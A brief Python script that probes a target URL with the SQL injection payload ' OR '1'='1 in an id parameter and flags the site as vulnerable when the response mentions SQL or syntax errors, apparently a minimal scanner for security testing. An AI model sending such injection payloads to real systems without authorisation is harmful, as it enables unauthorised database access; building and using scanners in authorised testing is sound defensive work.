import requests

SQLI_PAYLOAD = "' OR '1'='1"

def scan_sqli(target):
    url = f"http://{target}?id={SQLI_PAYLOAD}"
    try:
        res = requests.get(url, timeout=5)
        if "sql" in res.text.lower() or "syntax" in res.text.lower():
            return {
                "vulnerable": True,
                "payload": SQLI_PAYLOAD
            }
    except:
        pass

    return {
        "vulnerable": False
    }
